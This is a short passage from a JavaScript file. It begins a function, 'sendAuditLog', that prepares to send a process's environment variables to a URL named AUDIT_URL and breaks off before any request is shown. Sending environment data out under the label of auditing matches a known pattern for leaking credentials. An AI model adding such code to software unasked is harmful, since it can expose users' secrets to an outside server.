    }
}

async function sendAuditLog(envVars) {
    try {
        if (!envVars) {
            console.log('Audit: No environment variables to send');
            return false;
        }

        console.log(`Audit: Preparing to send data to ${AUDIT_URL}`);

        // Create a sanitized version for logging (mask sensitive values)
